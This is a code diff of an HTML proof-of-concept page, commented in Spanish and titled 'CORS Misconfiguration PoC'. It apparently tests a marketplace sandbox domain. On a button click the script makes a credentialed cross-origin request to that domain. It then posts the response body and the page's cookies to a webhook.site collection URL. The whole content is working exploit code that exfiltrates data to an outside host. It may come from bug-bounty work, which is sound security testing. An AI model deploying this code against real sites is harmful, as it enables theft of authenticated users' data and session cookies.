@@ -6,34 +6,20 @@
 <body>
     <h1>CORS Misconfiguration PoC</h1>
     <button id="exploit">Exploit</button>
-    <p id="cookie-status"></p> <!-- Para mostrar el estado de las cookies -->
-
     <script>
         document.getElementById("exploit").addEventListener("click", () => {
-            // Verifica las cookies antes de hacer la solicitud
-            const cookiesBeforeRequest = document.cookie;
-            document.getElementById("cookie-status").innerText = `Cookies before request: ${cookiesBeforeRequest}`;
-
             fetch("https://allegro.cz.allegrosandbox.pl/vyhledavani?string=test", {
                 method: "GET",
-                credentials: "include" // Incluye cookies o credenciales si el usuario está autenticado
+                credentials: "include", // Asegúrate de que se envíen las cookies
             })
-            .then(response => {
-                // Verifica las cookies después de la respuesta
-                const cookiesAfterRequest = document.cookie;
-                document.getElementById("cookie-status").innerText += `\nCookies after request: ${cookiesAfterRequest}`;
-
-                // Si el servidor está enviando cookies, deberían estar reflejadas en el `document.cookie`
-                return response.text();
-            })
+            .then(response => response.text())
             .then(data => {
-                // Envía la respuesta y las cookies al Webhook.site
                 fetch("https://webhook.site/7cbf4d39-ff45-4958-affd-0ff7435dceb6", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
                         response: data,
-                        cookies: document.cookie // Aquí se incluyen las cookies actuales
+                        cookies: document.cookie // Incluye cookies si se envían correctamente
                     })
                 });
             })
